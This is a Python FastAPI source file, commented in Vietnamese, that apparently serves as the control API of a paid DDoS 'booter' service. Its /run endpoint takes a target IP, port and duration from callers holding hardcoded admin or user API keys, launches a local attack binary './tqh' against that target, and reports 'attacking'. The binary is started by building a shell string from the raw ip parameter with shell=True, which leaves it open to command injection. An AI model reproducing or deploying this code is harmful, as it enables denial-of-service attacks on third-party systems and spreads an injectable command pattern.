from fastapi import FastAPI, Query, HTTPException
import subprocess
import time
from collections import defaultdict
import socket
import os

app = FastAPI()

# Định nghĩa API Key
ADMIN_API_KEY = "tqhuy27299999!?"
USER_API_KEY = "ngumoitintao"

# Giới hạn request cho API Key thường (3 request/giây)
RATE_LIMIT = 3  # Số request tối đa trong 1 giây
user_requests = defaultdict(list)

@app.get("/")
def home():
    return {"message": "API đang chạy. Hãy sử dụng query ?apikey=&ip=&port=&time="}

@app.get("/run")
def run_bot(
    apikey: str = Query(..., description="API Key để xác thực"),
    ip: str = Query(..., description="Địa chỉ IP mục tiêu"),
    port: int = Query(..., description="Cổng tấn công"),
    time_run: int = Query(..., alias="time", description="Thời gian chạy (giây)")
):
    current_time = time.time()

    # Kiểm tra API Key Admin
    if apikey == ADMIN_API_KEY:
        pass  # Admin không bị giới hạn

    # Kiểm tra API Key Thường
    elif apikey == USER_API_KEY:
        # Giới hạn request
        user_requests[apikey] = [t for t in user_requests[apikey] if current_time - t < 60]  # Giới hạn theo phút
        if len(user_requests[apikey]) >= RATE_LIMIT:
            raise HTTPException(status_code=429, detail="Quá nhiều request! Vui lòng chờ.")

        # Lưu lại thời gian request
        user_requests[apikey].append(current_time)

        # Giới hạn thời gian chạy từ 10-100 giây
        if not (10 <= time_run <= 100):
            raise HTTPException(status_code=400, detail="Giới hạn thời gian là 10-100 giây!")

    else:
        raise HTTPException(status_code=403, detail="API Key không hợp lệ!")

    # Kiểm tra nếu tệp ./tqh tồn tại
    if not os.path.exists("./tqh"):
        raise HTTPException(status_code=404, detail="Lỗi rồi !!")

    # Chạy file ./tqh với tham số
    try:
        command = f"./tqh {ip} {port} {time_run}"
        subprocess.Popen(command, shell=True)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Lỗi khi chạy bot: {str(e)}")

    return {"status": "success", "message": "Đang tấn công!", "ip": ip, "port": port, "time": time_run}

# Hàm kiểm tra xem cổng có bị chiếm hay không
def check_port_availability(port: int) -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        sock.connect(('localhost', port))
        return False  # Nếu cổng bị chiếm
    except socket.error:
        return True  # Nếu cổng không bị chiếm
    finally:
        sock.close()

# Chạy ứng dụng trên cổng không trùng lặp
if __name__ == "__main__":
    port = 8000  # Cổng mặc định
    while not check_port_availability(port):
        port += 1  # Thử cổng kế tiếp cho đến khi tìm thấy cổng trống

    print(f"Chạy ứng dụng trên cổng {port}")
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=port)
